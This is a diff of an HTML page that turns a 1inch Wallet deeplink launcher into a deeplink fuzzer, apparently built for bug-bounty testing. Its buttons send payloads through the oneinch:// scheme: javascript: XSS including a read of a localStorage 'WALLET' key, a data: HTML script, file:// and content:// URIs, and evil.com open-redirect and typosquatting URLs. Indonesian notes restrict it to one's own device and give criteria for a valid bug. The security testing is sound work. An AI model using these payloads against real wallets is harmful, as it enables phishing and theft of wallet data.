@@ -1,59 +1,59 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Open in 1inch Wallet</title>
+<title>1inch Deeplink Fuzzer - Ethical Test</title>
+<style>
+ body{background:#0f0f0f;color:#fff;font-family:monospace;padding:15px}
+ button{width:100%;padding:12px;margin:6px 0;background:#222;color:#fff;border:1px solid #444;border-radius:8px;text-align:left}
+ h3{color:#f5ff00;margin-top:25px}.p1{border-left:3px solid red}.p2{border-left:3px solid orange}
+ small{color:#888}
+</style>
 </head>
-<body style="background:#0f1114; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
+<body>
+<h2>1inch Wallet Deeplink Fuzzer</h2>
+<small>Hanya test di device sendiri. Jangan pakai untuk phishing. Target: P1 XSS / Open Redirect</small>
 
-<div style="background:#1c1f26; padding:32px; border-radius:20px; text-align:center; max-width:340px; width:90%; border:1px solid #2a2e39;">
-  <h2 style="color:white; margin:0 0 10px 0;">Open 1inch DApp</h2>
-  <p style="color:#9aa0b0; font-size:14px; margin-bottom:24px;">Buka langsung di DApp Browser 1inch Wallet</p>
+<h3>[P1] XSS via javascript: scheme</h3>
+<button class="p1" onclick="go('javascript:alert(document.domain)')">1. javascript:alert(domain)</button>
+<button class="p1" onclick="go('javascript:alert(localStorage.getItem(`WALLET`))')">2. javascript: try read storage</button>
+<button class="p1" onclick="go('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')">3. data:text/html XSS</button>
 
-  <button id="openBtn" style="width:100%; padding:16px; background:white; color:black; border:none; border-radius:12px; font-weight:700; font-size:16px; cursor:pointer;">
-    Open in 1inch Wallet
-  </button>
-  
-  <p style="color:#555; font-size:11px; margin-top:16px;">Jika belum install, akan diarahkan ke App Store / Play Store</p>
-</div>
+<h3>[P1] File / Deeplink scheme bypass</h3>
+<button onclick="go('file:///etc/hosts')">4. file:/// bypass</button>
+<button onclick="go('content://settings/system')">5. content:// bypass</button>
+
+<h3>[P2] Open Redirect & Phishing (no warning?)</h3>
+<button class="p2" onclick="go('https://evil.com')">6. https://evil.com - ada warning gak?</button>
+<button class="p2" onclick="go('https://app.1inch.io@evil.com')">7. https://app.1inch.io@evil.com (at-trick)</button>
+<button class="p2" onclick="go('https://app-1inch-io.evil.com')">8. typosquatting domain</button>
+
+<h3>[P2] URL Param Injection</h3>
+<button onclick="go('https://app.1inch.io/?callback=https://evil.com')">9.?callback=evil.com</button>
+<button onclick="go('https://app.1inch.io#@evil.com')">10. hash @evil.com</button>
+<button onclick="go('https://app.1inch.io%0Aevil.com')">11. newline injection</button>
+
+<h3>[INFO] Normal Behavior (Harus Sukses)</h3>
+<button onclick="go('https://app.1inch.io')">12. Normal 1inch - HARUS BISA</button>
+<button onclick="go('https://app.uniswap.org')">13. Uniswap - boleh gak?</button>
 
 <script>
-  const DAPP_URL = "https://app.1inch.io";
-  const ENCODED_DAPP_URL = encodeURIComponent(DAPP_URL);
-
-  // Deeplink resmi 1inch Wallet
-  const NATIVE_LINK = `oneinch://open_url?url=${ENCODED_DAPP_URL}`;
-  
-  // Universal Link resmi (untuk fallback)
-  const UNIVERSAL_LINK = `https://1inch-wallet.onelink.me/wr3b?af_dp=${encodeURIComponent(NATIVE_LINK)}&af_web_dp=${ENCODED_DAPP_URL}`;
-
-  const APPSTORE_IOS = "https://apps.apple.com/app/1inch-crypto-defi-wallet/id1486564087";
-  const APPSTORE_ANDROID = "https://play.google.com/store/apps/details?id=io.oneinch.android";
-
-  document.getElementById('openBtn').addEventListener('click', function() {
-    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
-    const isAndroid = /Android/.test(navigator.userAgent);
-
-    // Coba buka native app
-    window.location.href = NATIVE_LINK;
-
-    // Fallback jika app tidak terinstall setelah 1.8 detik
-    setTimeout(() => {
-      if (isIOS) {
-        window.location.href = APPSTORE_IOS;
-      } else if (isAndroid) {
-        window.location.href = APPSTORE_ANDROID;
-      } else {
-        // Desktop -> buka web biasa
-        window.open(DAPP_URL, '_blank');
-      }
-    }, 1800);
-  });
-
-  // Auto open jika di mobile
-  // window.onload = () => { document.getElementById('openBtn').click(); }
+const SCHEME = "oneinch://open_url?url=";
+function go(payload){
+  const finalUrl = SCHEME + encodeURIComponent(payload);
+  console.log(finalUrl);
+  document.getElementById('log').innerText = "Trying: " + finalUrl;
+  window.location.href = finalUrl;
+}
 </script>
 
+<div id="log" style="margin-top:20px;background:#111;padding:10px;word-break:break-all;border-radius:8px;"></div>
+
+<p style="margin-top:30px;color:#555;font-size:11px">
+BUG VALID kalau: No 1-5 muncul alert di DALAM DApp Browser 1inch Wallet.<br>
+BUG VALID kalau: No 6-8 langsung kebuka tanpa ada warning "You are visiting external site".<br>
+BUKAN BUG kalau: Cuma bisa buka aplikasi dari Chrome, itu fitur by design.
+</p>
 </body>
 </html>
